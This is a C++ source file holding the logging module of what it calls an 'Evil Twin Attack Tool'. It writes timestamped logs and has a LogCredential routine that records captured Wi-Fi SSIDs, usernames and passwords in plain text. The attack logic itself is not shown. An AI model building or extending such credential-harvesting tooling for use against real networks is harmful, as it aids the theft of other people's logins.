/**
 * @file Logger.cpp
 * @brief Logging functionality implementation
 */

#include "Logger.h"

class LoggerImpl : public Logger {
private:
    std::string logPath;
    std::ofstream logFile;
    std::mutex logMutex;
    LogCallback logCallback;
    std::vector<std::string> recentLogs;

public:
    LoggerImpl() {}
    ~LoggerImpl() { Shutdown(); }
    
    bool Initialize(const std::string& path = "logs/") override {
        logPath = path;
        try { if (!fs::exists(logPath)) fs::create_directories(logPath); }
        catch (...) { return false; }
        
        auto now = std::chrono::system_clock::now();
        auto time = std::chrono::system_clock::to_time_t(now);
        std::stringstream filename;
        filename << logPath << "evil_twin_"
                 << std::put_time(std::localtime(&time), "%Y%m%d_%H%M%S") << ".log";
        
        logFile.open(filename.str(), std::ios::out | std::ios::app);
        if (!logFile.is_open()) return false;
        
        LogInfo("=== Evil Twin Attack Tool Log Started ===");
        return true;
    }
    
    void Shutdown() override {
        if (logFile.is_open()) {
            LogInfo("=== Log Ended ===");
            logFile.close();
        }
    }
    
    void Log(const std::string& message, bool toConsole = true) override {
        std::lock_guard<std::mutex> lock(logMutex);
        auto now = std::chrono::system_clock::now();
        auto time = std::chrono::system_clock::to_time_t(now);
        
        std::stringstream ss;
        ss << std::put_time(std::localtime(&time), "%Y-%m-%d %H:%M:%S") << " - " << message;
        std::string entry = ss.str();
        
        if (logFile.is_open()) { logFile << entry << "\n"; logFile.flush(); }
        recentLogs.push_back(entry);
        if (recentLogs.size() > 1000) recentLogs.erase(recentLogs.begin());
        
        if (toConsole) {
            if (logCallback) logCallback(entry);
            std::cout << entry << "\n";
        }
    }
    
    void LogCredential(const Credential& cred) override {
        std::stringstream ss;
        ss << "[CREDENTIAL] SSID: " << cred.ssid << " | User: " << cred.username 
           << " | Pass: " << cred.password;
        Log(ss.str(), true);
    }
    
    void LogNetwork(const WiFiNetwork& network) override {
        std::stringstream ss;
        ss << "[NETWORK] SSID: " << network.ssid << " | BSSID: " << network.bssid;
        Log(ss.str(), false);
    }
    
    void LogError(const std::string& error) override { Log("[ERROR] " + error, true); }
    void LogInfo(const std::string& info) override { Log("[INFO] " + info, true); }
    void LogWarning(const std::string& warning) override { Log("[WARNING] " + warning, true); }
    void SetCallback(LogCallback callback) override { logCallback = callback; }
    std::string GetLogFilePath() override { return logPath; }
    std::vector<std::string> GetRecentLogs(int count = 100) override {
        std::lock_guard<std::mutex> lock(logMutex);
        if (count > (int)recentLogs.size()) count = recentLogs.size();
        return std::vector<std::string>(recentLogs.end() - count, recentLogs.end());
    }
};

// Factory function
std::unique_ptr<Logger> CreateLogger() {
    return std::make_unique<LoggerImpl>();
}
